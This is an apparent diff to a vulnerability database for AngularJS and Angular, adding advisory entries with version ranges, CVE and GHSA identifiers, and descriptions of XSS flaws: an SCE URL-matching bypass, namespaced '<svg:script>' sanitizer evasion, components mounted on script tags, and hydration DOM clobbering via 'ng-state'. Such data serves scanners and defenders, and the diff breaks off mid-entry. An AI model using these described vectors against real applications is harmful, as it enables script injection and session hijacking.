+                details: "A flaw in AngularJS' Strict Contextual Escaping (SCE) logic allows bypassing certain SCE policies for resource URLs and can lead to arbitrary JavaScript execution within the context of the victim's browser session.\n\n\nSCE's purpose is to ensure that only trusted or safe values are used in certain security-sensitive contexts, such as resource URLs, including URLs that define executable JavaScript scripts, '<iframe>' documents, route templates, etc. A flaw in the logic that tries to match entire URLs against regular expression matchers can result in partial matches for certain types of regular expressions, effectively bypassing the policies and allowing the use of unsafe values as resource URLs.\n\n\nThis issue affects AngularJS versions greater than or equal to 1.2.0-rc.3.\n\n\nNote:\nThe AngularJS project was already End-of-Life when this CVE was published and will not receive any updates to address this issue. For more information see the\xA0 End-of-Life announcement https://docs.angularjs.org/misc/version-support-status .",
+                info: [
+                  "https://access.redhat.com/security/cve/CVE-2026-11998",
+                  "https://bugzilla.redhat.com/show_bug.cgi?id=2492579",
+                  "https://codepen.io/herodevs/pen/JobQdmz/5b3896f56fab66f20cd25e698cf3faa8",
+                  "https://security.access.redhat.com/data/csaf/v2/vex/2026/cve-2026-11998.json",
+                  "https://www.herodevs.com/vulnerability-directory/cve-2026-11998",
+                  "https://www.herodevs.com/vulnerability-directory/cve-2026-11998?nes-for-angularjs"
+                ]
+              },
+              {
                 atOrAbove: "1.3.0",
                 below: "1.8.4",
                 cwe: [
@@ -14625,6 +15390,48 @@ Upgrade to version 1.9.0 or later.`,
               {
                 atOrAbove: "0",
                 below: "18.2.15",
+                severity: "medium",
+                cwe: [
+                  "CWE-79"
+                ],
+                identifiers: {
+                  summary: "@angular/core: Angular Template and Dynamic Component Namespace Bypass leading to Cross-Site Scripting (XSS)",
+                  githubID: "GHSA-692r-grfm-v8x7",
+                  CVE: [
+                    "CVE-2026-52725"
+                  ]
+                },
+                details: "An issue in the `@angular/core` package allows bypassing script-execution restrictions during dynamic component creation.\n\nSpecifically, the dynamic component instantiation mechanism (`createComponent`) failed to reject mounting components directly onto a `<script>` or namespaced script element (such as `<svg:script>`). This enabled the initialization of custom components on a tag that executes scripts, allowing attackers to hijack or inject script-executing hosts.\n\nThis flaw enables an attacker who can control the host element or selector parameter passed to `createComponent` to initialize or mount an Angular component directly onto a `<script>` tag, leading to execution of untrusted code or client-side Cross-Site Scripting (XSS).\n\n### Impact\nAny Angular application that registers dynamic components based on user-supplied parameters (like selectors or host elements) is vulnerable to this security bypass.\n\nOnce exploited, this allows a malicious actor to mount a dynamic component on a script tag, bypassing core dynamic component creation safeguards to execute arbitrary JavaScript within the target user's browser context. This could lead to session hijacking, sensitive data exposure, or unauthorized actions on behalf of the user.\n\n### Attack Preconditions\nTo successfully exploit these vulnerabilities, the following environment parameters and application states must all concurrently exist:\n1. **User-Controlled Host Selection:** The application must accept user-controlled inputs that are passed as a selector/host element to `createComponent`.\n2. **Absence of Additional Context Sanitization:** The application does not perform separate input sanitization before feeding values to the dynamic creation APIs.\n\n### Patches\n* 22.0.0-rc.2\n* 21.2.15\n* 20.3.22\n* 19.2.23",
+                info: [
+                  "https://github.com/angular/angular/security/advisories/GHSA-692r-grfm-v8x7",
+                  "https://github.com/angular/angular/pull/68686",
+                  "https://github.com/angular/angular/pull/68713"
+                ]
+              },
+              {
+                atOrAbove: "0",
+                below: "18.2.15",
+                severity: "medium",
+                cwe: [
+                  "CWE-79"
+                ],
+                identifiers: {
+                  summary: "Angular: Template and Attribute Namespace Sanitization Bypass (XSS)",
+                  githubID: "GHSA-f3m7-gqxr-g87x",
+                  CVE: [
+                    "CVE-2026-50557"
+                  ]
+                },
+                details: "An issue in the `@angular/compiler` and `@angular/core` packages allows bypassing element and attribute sanitization/validation through specific namespace workarounds.\n\nSpecifically, namespaced script elements (e.g., `<svg:script>` or `<:svg:script>`) were not properly identified as script elements by the Angular template preparser, allowing them to pass through template compilation without being stripped.\n\nFurthermore, security context schema mappings for element attributes did not consistently handle attributes within namespaced elements (like SVG and MathML), opening up gaps where malicious namespaced attributes could bypass runtime and compile-time sanitizers.\n\nCombined, these flaws enable an attacker who can inject or supply a template/tag structure with custom namespaces to bypass Angular's script-stripping logic and attribute sanitizers, leading to client-side Cross-Site Scripting (XSS).\n\n### Impact\nAny Angular application that compiles user-controlled templates at runtime, or relies on sanitization of namespaced elements/attributes, is vulnerable to this security bypass.\n\nOnce exploited, this allows a malicious actor to inject a namespaced script element or dynamic attribute bindings, bypassing core sanitization constraints to execute arbitrary JavaScript within the target user's browser context. This could lead to session hijacking, sensitive data exposure, or unauthorized actions on behalf of the user.\n\n### Attack Preconditions\nTo successfully exploit these vulnerabilities, the following environment parameters and application states must all concurrently exist:\n1. **User-Controlled Template Input:** The application must accept user-controlled inputs that are directly processed by the Angular template compiler at runtime.\n2. **Namespace Parsing Support:** The input structure must employ custom namespace prefixes (such as `<svg:script>`) to evade standard tag-name blocklists/checks.\n3. **Absence of Additional Context Sanitization:** The application does not perform separate input sanitization before feeding values to the Angular compiler.\n\n### Patches\n* 22.0.0-rc.2\n* 21.2.15\n* 20.3.22\n* 19.2.23",
+                info: [
+                  "https://github.com/angular/angular/security/advisories/GHSA-f3m7-gqxr-g87x",
+                  "https://github.com/angular/angular/pull/68689",
+                  "https://github.com/angular/angular/pull/68868"
+                ]
+              },
+              {
+                atOrAbove: "0",
+                below: "18.2.15",
                 severity: "high",
                 cwe: [
                   "CWE-79"
@@ -14727,6 +15534,70 @@ Upgrade to version 1.9.0 or later.`,
                 ]
               },
               {
+                atOrAbove: "19.0.0-next.0",
+                below: "19.2.22",
+                severity: "medium",
+                cwe: [
+                  "CWE-79"
+                ],
+                identifiers: {
+                  summary: "Angular: Template and Attribute Namespace Sanitization Bypass (XSS)",
+                  githubID: "GHSA-f3m7-gqxr-g87x",
+                  CVE: [
+                    "CVE-2026-50557"
+                  ]
+                },
+                details: "An issue in the `@angular/compiler` and `@angular/core` packages allows bypassing element and attribute sanitization/validation through specific namespace workarounds.\n\nSpecifically, namespaced script elements (e.g., `<svg:script>` or `<:svg:script>`) were not properly identified as script elements by the Angular template preparser, allowing them to pass through template compilation without being stripped.\n\nFurthermore, security context schema mappings for element attributes did not consistently handle attributes within namespaced elements (like SVG and MathML), opening up gaps where malicious namespaced attributes could bypass runtime and compile-time sanitizers.\n\nCombined, these flaws enable an attacker who can inject or supply a template/tag structure with custom namespaces to bypass Angular's script-stripping logic and attribute sanitizers, leading to client-side Cross-Site Scripting (XSS).\n\n### Impact\nAny Angular application that compiles user-controlled templates at runtime, or relies on sanitization of namespaced elements/attributes, is vulnerable to this security bypass.\n\nOnce exploited, this allows a malicious actor to inject a namespaced script element or dynamic attribute bindings, bypassing core sanitization constraints to execute arbitrary JavaScript within the target user's browser context. This could lead to session hijacking, sensitive data exposure, or unauthorized actions on behalf of the user.\n\n### Attack Preconditions\nTo successfully exploit these vulnerabilities, the following environment parameters and application states must all concurrently exist:\n1. **User-Controlled Template Input:** The application must accept user-controlled inputs that are directly processed by the Angular template compiler at runtime.\n2. **Namespace Parsing Support:** The input structure must employ custom namespace prefixes (such as `<svg:script>`) to evade standard tag-name blocklists/checks.\n3. **Absence of Additional Context Sanitization:** The application does not perform separate input sanitization before feeding values to the Angular compiler.\n\n### Patches\n* 22.0.0-rc.2\n* 21.2.15\n* 20.3.22\n* 19.2.23",
+                info: [
+                  "https://github.com/angular/angular/security/advisories/GHSA-f3m7-gqxr-g87x",
+                  "https://github.com/angular/angular/pull/68689",
+                  "https://github.com/angular/angular/pull/68868"
+                ]
+              },
+              {
+                atOrAbove: "19.0.0-next.0",
+                below: "19.2.23",
+                severity: "medium",
+                cwe: [
+                  "CWE-79"
+                ],
+                identifiers: {
+                  summary: "@angular/core: Angular Template and Dynamic Component Namespace Bypass leading to Cross-Site Scripting (XSS)",
+                  githubID: "GHSA-692r-grfm-v8x7",
+                  CVE: [
+                    "CVE-2026-52725"
+                  ]
+                },
+                details: "An issue in the `@angular/core` package allows bypassing script-execution restrictions during dynamic component creation.\n\nSpecifically, the dynamic component instantiation mechanism (`createComponent`) failed to reject mounting components directly onto a `<script>` or namespaced script element (such as `<svg:script>`). This enabled the initialization of custom components on a tag that executes scripts, allowing attackers to hijack or inject script-executing hosts.\n\nThis flaw enables an attacker who can control the host element or selector parameter passed to `createComponent` to initialize or mount an Angular component directly onto a `<script>` tag, leading to execution of untrusted code or client-side Cross-Site Scripting (XSS).\n\n### Impact\nAny Angular application that registers dynamic components based on user-supplied parameters (like selectors or host elements) is vulnerable to this security bypass.\n\nOnce exploited, this allows a malicious actor to mount a dynamic component on a script tag, bypassing core dynamic component creation safeguards to execute arbitrary JavaScript within the target user's browser context. This could lead to session hijacking, sensitive data exposure, or unauthorized actions on behalf of the user.\n\n### Attack Preconditions\nTo successfully exploit these vulnerabilities, the following environment parameters and application states must all concurrently exist:\n1. **User-Controlled Host Selection:** The application must accept user-controlled inputs that are passed as a selector/host element to `createComponent`.\n2. **Absence of Additional Context Sanitization:** The application does not perform separate input sanitization before feeding values to the dynamic creation APIs.\n\n### Patches\n* 22.0.0-rc.2\n* 21.2.15\n* 20.3.22\n* 19.2.23",
+                info: [
+                  "https://github.com/angular/angular/security/advisories/GHSA-692r-grfm-v8x7",
+                  "https://github.com/angular/angular/pull/68686",
+                  "https://github.com/angular/angular/pull/68713"
+                ]
+              },
+              {
+                atOrAbove: "0",
+                below: "19.2.26",
+                severity: "high",
+                cwe: [
+                  "CWE-79",
+                  "CWE-471"
+                ],
+                identifiers: {
+                  summary: "Angular Client Hydration DOM Clobbering & Response-Cache Poisoning",
+                  githubID: "GHSA-rgjc-h3x7-9mwg",
+                  CVE: [
+                    "CVE-2026-54267"
+                  ]
+                },
+                details: "To optimize client-side bootstrap in Server-Side Rendered (SSR) environments, Angular supports **Hydration** via `provideClientHydration()`. During SSR, Angular serializes the application's runtime state (such as cached `HttpClient` responses) and outputs it into the HTML stream as a `<script>` tag with a predictable identifier:\n\n```html\n<script type=\"application/json\" id=\"ng-state\">\n    {\"some-api-url\": {\"body\": ...}}\n<\/script>\n````\n\nDuring client bootstrap, Angular recovers this state by looking up the element via `document.getElementById('ng-state')` and parsing its text content.\n\nBecause the DOM element lookup for the state container is predictable and relies solely on the ID selector (`ng-state`), it is susceptible to **DOM Clobbering**.\n\nIf the application binds untrusted user input or CMS content to element properties such as `id` (e.g., `<div [id]=\"userInput\">` or `<a id=\"ng-state\">`) *before* the genuine `<script>` tag is parsed by the browser, the attacker-controlled element takes precedence in the DOM lookup.\n\nDuring hydration, when Angular calls `document.getElementById('ng-state')`, the browser returns the attacker's clobbered element. Angular then attempts to parse the text content or attributes of this clobbered element as JSON.\n\n### Impact\n\nBy clobbering the state element, the attacker can inject a custom JSON payload into Angular's `TransferState` cache. The most critical exploitation vector is poisoning the **HTTP Transfer Cache**.\n\n1. The attacker injects a clobbered `ng-state` element containing custom JSON.  \n2. The JSON maps a key (representing a target API endpoint URL) to a malicious payload of the attacker's choice.  \n3. During client-side initialization, Angular's `HttpClient` checks `TransferState` before making requests. Finding the poisoned key, `HttpClient` returns the forged response instantly instead of requesting the genuine backend API.\n\nDepending on how the application processes and renders the affected API response, this can lead to:\n\n* **DOM-based Cross-Site Scripting (XSS)** if poisoned fields are rendered using unsafe bindings.  \n* **Privilege Escalation** by spoofing user info or session details retrieved from poisoned API payloads.  \n* **UI Hijacking** and redirection by spoofing configuration endpoints.\n\n### Patched Versions\n\n* 22.0.1  \n* 21.2.17  \n* 20.3.25\n\n### Workarounds\n\nIf you cannot immediately update to a patched Angular version, apply the following workarounds:\n\n#### A. Avoid Dynamic/User-Controlled IDs\n\nAvoid binding raw user-supplied values or dynamic CMS IDs directly to element attributes. If dynamic IDs are required, sanitize them or prepend a static safe prefix:\n\n```html\n<!-- Vulnerable Pattern -->\n<div [id]=\"userControlledInput\">...</div>\n\n<!-- Mitigated Pattern -->\n<div [id]=\"'safe-prefix-' + userControlledInput\">...</div>\n```\n\n#### B. Configure a Custom Application ID\n\nDeclaring a unique, non-predictable `APP_ID` changes the ID suffix of the state element, making it harder for attackers to predict and target:\n\n```ts\n// app.config.ts\n\nimport { APP_ID } from '@angular/core';\nimport { provideClientHydration } from '@angular/platform-browser';\n\nexport const appConfig = {\n  providers: [\n    { provide: APP_ID, useValue: 'unique-obfuscated-app-id' },\n    provideClientHydration()\n  ]\n};\n\n```\n\nThis changes the state element lookup ID from `ng-state` to `unique-obfuscated-app-id-state`.",
+                info: [
+                  "https://github.com/angular/angular/security/advisories/GHSA-rgjc-h3x7-9mwg",
+                  "https://github.com/angular/angular/pull/69064",
+                  "https://github.com/angular/angular/commit/6bde84fa8e6a5770b54040fbbc9bf10d5d0386fa"
+                ]
+              },
+              {
                 atOrAbove: "20.0.0-next.0",
                 below: "20.3.17",
                 severity: "high",
@@ -14776,6 +15647,70 @@ Upgrade to version 1.9.0 or later.`,
                   "https://github.com/angular/angular/commit/78dea55351fb305b33a919c43a6b363137eca166",
                   "https://github.com/angular/angular/commit/8630319f74c9575a21693d875cc7d5252516146d",
                   "https://github.com/angular/angular/commit/ed2d324f9cc12aab6cfa0569ef10b73243a62c65"
+                ]
+              },
+              {
+                atOrAbove: "20.0.0-next.0",
+                below: "20.3.22",
+                severity: "medium",
+                cwe: [
+                  "CWE-79"
+                ],
+                identifiers: {
+                  summary: "@angular/core: Angular Template and Dynamic Component Namespace Bypass leading to Cross-Site Scripting (XSS)",
+                  githubID: "GHSA-692r-grfm-v8x7",
+                  CVE: [
+                    "CVE-2026-52725"
+                  ]
+                },
+                details: "An issue in the `@angular/core` package allows bypassing script-execution restrictions during dynamic component creation.\n\nSpecifically, the dynamic component instantiation mechanism (`createComponent`) failed to reject mounting components directly onto a `<script>` or namespaced script element (such as `<svg:script>`). This enabled the initialization of custom components on a tag that executes scripts, allowing attackers to hijack or inject script-executing hosts.\n\nThis flaw enables an attacker who can control the host element or selector parameter passed to `createComponent` to initialize or mount an Angular component directly onto a `<script>` tag, leading to execution of untrusted code or client-side Cross-Site Scripting (XSS).\n\n### Impact\nAny Angular application that registers dynamic components based on user-supplied parameters (like selectors or host elements) is vulnerable to this security bypass.\n\nOnce exploited, this allows a malicious actor to mount a dynamic component on a script tag, bypassing core dynamic component creation safeguards to execute arbitrary JavaScript within the target user's browser context. This could lead to session hijacking, sensitive data exposure, or unauthorized actions on behalf of the user.\n\n### Attack Preconditions\nTo successfully exploit these vulnerabilities, the following environment parameters and application states must all concurrently exist:\n1. **User-Controlled Host Selection:** The application must accept user-controlled inputs that are passed as a selector/host element to `createComponent`.\n2. **Absence of Additional Context Sanitization:** The application does not perform separate input sanitization before feeding values to the dynamic creation APIs.\n\n### Patches\n* 22.0.0-rc.2\n* 21.2.15\n* 20.3.22\n* 19.2.23",
+                info: [
+                  "https://github.com/angular/angular/security/advisories/GHSA-692r-grfm-v8x7",
+                  "https://github.com/angular/angular/pull/68686",
+                  "https://github.com/angular/angular/pull/68713"
+                ]
+              },
+              {
+                atOrAbove: "20.0.0-next.0",
+                below: "20.3.22",
+                severity: "medium",
+                cwe: [
+                  "CWE-79"
+                ],
+                identifiers: {
+                  summary: "Angular: Template and Attribute Namespace Sanitization Bypass (XSS)",
+                  githubID: "GHSA-f3m7-gqxr-g87x",
+                  CVE: [
+                    "CVE-2026-50557"
+                  ]
+                },
+                details: "An issue in the `@angular/compiler` and `@angular/core` packages allows bypassing element and attribute sanitization/validation through specific namespace workarounds.\n\nSpecifically, namespaced script elements (e.g., `<svg:script>` or `<:svg:script>`) were not properly identified as script elements by the Angular template preparser, allowing them to pass through template compilation without being stripped.\n\nFurthermore, security context schema mappings for element attributes did not consistently handle attributes within namespaced elements (like SVG and MathML), opening up gaps where malicious namespaced attributes could bypass runtime and compile-time sanitizers.\n\nCombined, these flaws enable an attacker who can inject or supply a template/tag structure with custom namespaces to bypass Angular's script-stripping logic and attribute sanitizers, leading to client-side Cross-Site Scripting (XSS).\n\n### Impact\nAny Angular application that compiles user-controlled templates at runtime, or relies on sanitization of namespaced elements/attributes, is vulnerable to this security bypass.\n\nOnce exploited, this allows a malicious actor to inject a namespaced script element or dynamic attribute bindings, bypassing core sanitization constraints to execute arbitrary JavaScript within the target user's browser context. This could lead to session hijacking, sensitive data exposure, or unauthorized actions on behalf of the user.\n\n### Attack Preconditions\nTo successfully exploit these vulnerabilities, the following environment parameters and application states must all concurrently exist:\n1. **User-Controlled Template Input:** The application must accept user-controlled inputs that are directly processed by the Angular template compiler at runtime.\n2. **Namespace Parsing Support:** The input structure must employ custom namespace prefixes (such as `<svg:script>`) to evade standard tag-name blocklists/checks.\n3. **Absence of Additional Context Sanitization:** The application does not perform separate input sanitization before feeding values to the Angular compiler.\n\n### Patches\n* 22.0.0-rc.2\n* 21.2.15\n* 20.3.22\n* 19.2.23",
+                info: [
+                  "https://github.com/angular/angular/security/advisories/GHSA-f3m7-gqxr-g87x",
+                  "https://github.com/angular/angular/pull/68689",
+                  "https://github.com/angular/angular/pull/68868"
+                ]
+              },
+              {
+                atOrAbove: "20.0.0-next.0",
+                below: "20.3.25",
+                severity: "high",
+                cwe: [
+                  "CWE-79",
+                  "CWE-471"
+                ],
+                identifiers: {
+                  summary: "Angular Client Hydration DOM Clobbering & Response-Cache Poisoning",
+                  githubID: "GHSA-rgjc-h3x7-9mwg",
+                  CVE: [
+                    "CVE-2026-54267"
+                  ]
+                },
+                details: "To optimize client-side bootstrap in Server-Side Rendered (SSR) environments, Angular supports **Hydration** via `provideClientHydration()`. During SSR, Angular serializes the application's runtime state (such as cached `HttpClient` responses) and outputs it into the HTML stream as a `<script>` tag with a predictable identifier:\n\n```html\n<script type=\"application/json\" id=\"ng-state\">\n    {\"some-api-url\": {\"body\": ...}}\n<\/script>\n````\n\nDuring client bootstrap, Angular recovers this state by looking up the element via `document.getElementById('ng-state')` and parsing its text content.\n\nBecause the DOM element lookup for the state container is predictable and relies solely on the ID selector (`ng-state`), it is susceptible to **DOM Clobbering**.\n\nIf the application binds untrusted user input or CMS content to element properties such as `id` (e.g., `<div [id]=\"userInput\">` or `<a id=\"ng-state\">`) *before* the genuine `<script>` tag is parsed by the browser, the attacker-controlled element takes precedence in the DOM lookup.\n\nDuring hydration, when Angular calls `document.getElementById('ng-state')`, the browser returns the attacker's clobbered element. Angular then attempts to parse the text content or attributes of this clobbered element as JSON.\n\n### Impact\n\nBy clobbering the state element, the attacker can inject a custom JSON payload into Angular's `TransferState` cache. The most critical exploitation vector is poisoning the **HTTP Transfer Cache**.\n\n1. The attacker injects a clobbered `ng-state` element containing custom JSON.  \n2. The JSON maps a key (representing a target API endpoint URL) to a malicious payload of the attacker's choice.  \n3. During client-side initialization, Angular's `HttpClient` checks `TransferState` before making requests. Finding the poisoned key, `HttpClient` returns the forged response instantly instead of requesting the genuine backend API.\n\nDepending on how the application processes and renders the affected API response, this can lead to:\n\n* **DOM-based Cross-Site Scripting (XSS)** if poisoned fields are rendered using unsafe bindings.  \n* **Privilege Escalation** by spoofing user info or session details retrieved from poisoned API payloads.  \n* **UI Hijacking** and redirection by spoofing configuration endpoints.\n\n### Patched Versions\n\n* 22.0.1  \n* 21.2.17  \n* 20.3.25\n\n### Workarounds\n\nIf you cannot immediately update to a patched Angular version, apply the following workarounds:\n\n#### A. Avoid Dynamic/User-Controlled IDs\n\nAvoid binding raw user-supplied values or dynamic CMS IDs directly to element attributes. If dynamic IDs are required, sanitize them or prepend a static safe prefix:\n\n```html\n<!-- Vulnerable Pattern -->\n<div [id]=\"userControlledInput\">...</div>\n\n<!-- Mitigated Pattern -->\n<div [id]=\"'safe-prefix-' + userControlledInput\">...</div>\n```\n\n#### B. Configure a Custom Application ID\n\nDeclaring a unique, non-predictable `APP_ID` changes the ID suffix of the state element, making it harder for attackers to predict and target:\n\n```ts\n// app.config.ts\n\nimport { APP_ID } from '@angular/core';\nimport { provideClientHydration } from '@angular/platform-browser';\n\nexport const appConfig = {\n  providers: [\n    { provide: APP_ID, useValue: 'unique-obfuscated-app-id' },\n    provideClientHydration()\n  ]\n};\n\n```\n\nThis changes the state element lookup ID from `ng-state` to `unique-obfuscated-app-id-state`.",
+                info: [
+                  "https://github.com/angular/angular/security/advisories/GHSA-rgjc-h3x7-9mwg",
+                  "https://github.com/angular/angular/pull/69064",
+                  "https://github.com/angular/angular/commit/6bde84fa8e6a5770b54040fbbc9bf10d5d0386fa"
                 ]
               },
               {
@@ -14858,6 +15793,112 @@ Upgrade to version 1.9.0 or later.`,
                 ]
               },
               {
+                atOrAbove: "21.0.0-next.0",
+                below: "21.2.15",
+                severity: "medium",
+                cwe: [
+                  "CWE-79"
+                ],
+                identifiers: {
+                  summary: "@angular/core: Angular Template and Dynamic Component Namespace Bypass leading to Cross-Site Scripting (XSS)",
+                  githubID: "GHSA-692r-grfm-v8x7",
+                  CVE: [
+                    "CVE-2026-52725"
+                  ]
+                },
+                details: "An issue in the `@angular/core` package allows bypassing script-execution restrictions during dynamic component creation.\n\nSpecifically, the dynamic component instantiation mechanism (`createComponent`) failed to reject mounting components directly onto a `<script>` or namespaced script element (such as `<svg:script>`). This enabled the initialization of custom components on a tag that executes scripts, allowing attackers to hijack or inject script-executing hosts.\n\nThis flaw enables an attacker who can control the host element or selector parameter passed to `createComponent` to initialize or mount an Angular component directly onto a `<script>` tag, leading to execution of untrusted code or client-side Cross-Site Scripting (XSS).\n\n### Impact\nAny Angular application that registers dynamic components based on user-supplied parameters (like selectors or host elements) is vulnerable to this security bypass.\n\nOnce exploited, this allows a malicious actor to mount a dynamic component on a script tag, bypassing core dynamic component creation safeguards to execute arbitrary JavaScript within the target user's browser context. This could lead to session hijacking, sensitive data exposure, or unauthorized actions on behalf of the user.\n\n### Attack Preconditions\nTo successfully exploit these vulnerabilities, the following environment parameters and application states must all concurrently exist:\n1. **User-Controlled Host Selection:** The application must accept user-controlled inputs that are passed as a selector/host element to `createComponent`.\n2. **Absence of Additional Context Sanitization:** The application does not perform separate input sanitization before feeding values to the dynamic creation APIs.\n\n### Patches\n* 22.0.0-rc.2\n* 21.2.15\n* 20.3.22\n* 19.2.23",
+                info: [
+                  "https://github.com/angular/angular/security/advisories/GHSA-692r-grfm-v8x7",
+                  "https://github.com/angular/angular/pull/68686",
+                  "https://github.com/angular/angular/pull/68713"
+                ]
+              },
+              {
+                atOrAbove: "21.0.0-next.0",
+                below: "21.2.15",
+                severity: "medium",
+                cwe: [
+                  "CWE-79"
+                ],
+                identifiers: {
+                  summary: "Angular: Template and Attribute Namespace Sanitization Bypass (XSS)",
+                  githubID: "GHSA-f3m7-gqxr-g87x",
+                  CVE: [
+                    "CVE-2026-50557"
+                  ]
+                },
+                details: "An issue in the `@angular/compiler` and `@angular/core` packages allows bypassing element and attribute sanitization/validation through specific namespace workarounds.\n\nSpecifically, namespaced script elements (e.g., `<svg:script>` or `<:svg:script>`) were not properly identified as script elements by the Angular template preparser, allowing them to pass through template compilation without being stripped.\n\nFurthermore, security context schema mappings for element attributes did not consistently handle attributes within namespaced elements (like SVG and MathML), opening up gaps where malicious namespaced attributes could bypass runtime and compile-time sanitizers.\n\nCombined, these flaws enable an attacker who can inject or supply a template/tag structure with custom namespaces to bypass Angular's script-stripping logic and attribute sanitizers, leading to client-side Cross-Site Scripting (XSS).\n\n### Impact\nAny Angular application that compiles user-controlled templates at runtime, or relies on sanitization of namespaced elements/attributes, is vulnerable to this security bypass.\n\nOnce exploited, this allows a malicious actor to inject a namespaced script element or dynamic attribute bindings, bypassing core sanitization constraints to execute arbitrary JavaScript within the target user's browser context. This could lead to session hijacking, sensitive data exposure, or unauthorized actions on behalf of the user.\n\n### Attack Preconditions\nTo successfully exploit these vulnerabilities, the following environment parameters and application states must all concurrently exist:\n1. **User-Controlled Template Input:** The application must accept user-controlled inputs that are directly processed by the Angular template compiler at runtime.\n2. **Namespace Parsing Support:** The input structure must employ custom namespace prefixes (such as `<svg:script>`) to evade standard tag-name blocklists/checks.\n3. **Absence of Additional Context Sanitization:** The application does not perform separate input sanitization before feeding values to the Angular compiler.\n\n### Patches\n* 22.0.0-rc.2\n* 21.2.15\n* 20.3.22\n* 19.2.23",
+                info: [
+                  "https://github.com/angular/angular/security/advisories/GHSA-f3m7-gqxr-g87x",
+                  "https://github.com/angular/angular/pull/68689",
+                  "https://github.com/angular/angular/pull/68868"
+                ]
+              },
+              {
+                atOrAbove: "21.0.0-next.0",
+                below: "21.2.17",
+                severity: "high",
+                cwe: [
+                  "CWE-79",
+                  "CWE-471"
+                ],
+                identifiers: {
+                  summary: "Angular Client Hydration DOM Clobbering & Response-Cache Poisoning",
+                  githubID: "GHSA-rgjc-h3x7-9mwg",
+                  CVE: [
+                    "CVE-2026-54267"
+                  ]
+                },
+                details: "To optimize client-side bootstrap in Server-Side Rendered (SSR) environments, Angular supports **Hydration** via `provideClientHydration()`. During SSR, Angular serializes the application's runtime state (such as cached `HttpClient` responses) and outputs it into the HTML stream as a `<script>` tag with a predictable identifier:\n\n```html\n<script type=\"application/json\" id=\"ng-state\">\n    {\"some-api-url\": {\"body\": ...}}\n<\/script>\n````\n\nDuring client bootstrap, Angular recovers this state by looking up the element via `document.getElementById('ng-state')` and parsing its text content.\n\nBecause the DOM element lookup for the state container is predictable and relies solely on the ID selector (`ng-state`), it is susceptible to **DOM Clobbering**.\n\nIf the application binds untrusted user input or CMS content to element properties such as `id` (e.g., `<div [id]=\"userInput\">` or `<a id=\"ng-state\">`) *before* the genuine `<script>` tag is parsed by the browser, the attacker-controlled element takes precedence in the DOM lookup.\n\nDuring hydration, when Angular calls `document.getElementById('ng-state')`, the browser returns the attacker's clobbered element. Angular then attempts to parse the text content or attributes of this clobbered element as JSON.\n\n### Impact\n\nBy clobbering the state element, the attacker can inject a custom JSON payload into Angular's `TransferState` cache. The most critical exploitation vector is poisoning the **HTTP Transfer Cache**.\n\n1. The attacker injects a clobbered `ng-state` element containing custom JSON.  \n2. The JSON maps a key (representing a target API endpoint URL) to a malicious payload of the attacker's choice.  \n3. During client-side initialization, Angular's `HttpClient` checks `TransferState` before making requests. Finding the poisoned key, `HttpClient` returns the forged response instantly instead of requesting the genuine backend API.\n\nDepending on how the application processes and renders the affected API response, this can lead to:\n\n* **DOM-based Cross-Site Scripting (XSS)** if poisoned fields are rendered using unsafe bindings.  \n* **Privilege Escalation** by spoofing user info or session details retrieved from poisoned API payloads.  \n* **UI Hijacking** and redirection by spoofing configuration endpoints.\n\n### Patched Versions\n\n* 22.0.1  \n* 21.2.17  \n* 20.3.25\n\n### Workarounds\n\nIf you cannot immediately update to a patched Angular version, apply the following workarounds:\n\n#### A. Avoid Dynamic/User-Controlled IDs\n\nAvoid binding raw user-supplied values or dynamic CMS IDs directly to element attributes. If dynamic IDs are required, sanitize them or prepend a static safe prefix:\n\n```html\n<!-- Vulnerable Pattern -->\n<div [id]=\"userControlledInput\">...</div>\n\n<!-- Mitigated Pattern -->\n<div [id]=\"'safe-prefix-' + userControlledInput\">...</div>\n```\n\n#### B. Configure a Custom Application ID\n\nDeclaring a unique, non-predictable `APP_ID` changes the ID suffix of the state element, making it harder for attackers to predict and target:\n\n```ts\n// app.config.ts\n\nimport { APP_ID } from '@angular/core';\nimport { provideClientHydration } from '@angular/platform-browser';\n\nexport const appConfig = {\n  providers: [\n    { provide: APP_ID, useValue: 'unique-obfuscated-app-id' },\n    provideClientHydration()\n  ]\n};\n\n```\n\nThis changes the state element lookup ID from `ng-state` to `unique-obfuscated-app-id-state`.",
+                info: [
+                  "https://github.com/angular/angular/security/advisories/GHSA-rgjc-h3x7-9mwg",
+                  "https://github.com/angular/angular/pull/69064",
+                  "https://github.com/angular/angular/commit/6bde84fa8e6a5770b54040fbbc9bf10d5d0386fa"
+                ]
+              },
+              {
+                atOrAbove: "22.0.0-next.0",
+                below: "22.0.0-rc.2",
+                severity: "medium",
+                cwe: [
+                  "CWE-79"
+                ],
+                identifiers: {
+                  summary: "@angular/core: Angular Template and Dynamic Component Namespace Bypass leading to Cross-Site Scripting (XSS)",
+                  githubID: "GHSA-692r-grfm-v8x7",
+                  CVE: [
+                    "CVE-2026-52725"
+                  ]
+                },
+                details: "An issue in the `@angular/core` package allows bypassing script-execution restrictions during dynamic component creation.\n\nSpecifically, the dynamic component instantiation mechanism (`createComponent`) failed to reject mounting components directly onto a `<script>` or namespaced script element (such as `<svg:script>`). This enabled the initialization of custom components on a tag that executes scripts, allowing attackers to hijack or inject script-executing hosts.\n\nThis flaw enables an attacker who can control the host element or selector parameter passed to `createComponent` to initialize or mount an Angular component directly onto a `<script>` tag, leading to execution of untrusted code or client-side Cross-Site Scripting (XSS).\n\n### Impact\nAny Angular application that registers dynamic components based on user-supplied parameters (like selectors or host elements) is vulnerable to this security bypass.\n\nOnce exploited, this allows a malicious actor to mount a dynamic component on a script tag, bypassing core dynamic component creation safeguards to execute arbitrary JavaScript within the target user's browser context. This could lead to session hijacking, sensitive data exposure, or unauthorized actions on behalf of the user.\n\n### Attack Preconditions\nTo successfully exploit these vulnerabilities, the following environment parameters and application states must all concurrently exist:\n1. **User-Controlled Host Selection:** The application must accept user-controlled inputs that are passed as a selector/host element to `createComponent`.\n2. **Absence of Additional Context Sanitization:** The application does not perform separate input sanitization before feeding values to the dynamic creation APIs.\n\n### Patches\n* 22.0.0-rc.2\n* 21.2.15\n* 20.3.22\n* 19.2.23",
+                info: [
+                  "https://github.com/angular/angular/security/advisories/GHSA-692r-grfm-v8x7",
+                  "https://github.com/angular/angular/pull/68686",
+                  "https://github.com/angular/angular/pull/68713"
+                ]
+              },
+              {
+                atOrAbove: "22.0.0-next.0",
+                below: "22.0.0-rc.2",
+                severity: "medium",
+                cwe: [
+                  "CWE-79"
+                ],
+                identifiers: {
+                  summary: "Angular: Template and Attribute Namespace Sanitization Bypass (XSS)",
+                  githubID: "GHSA-f3m7-gqxr-g87x",
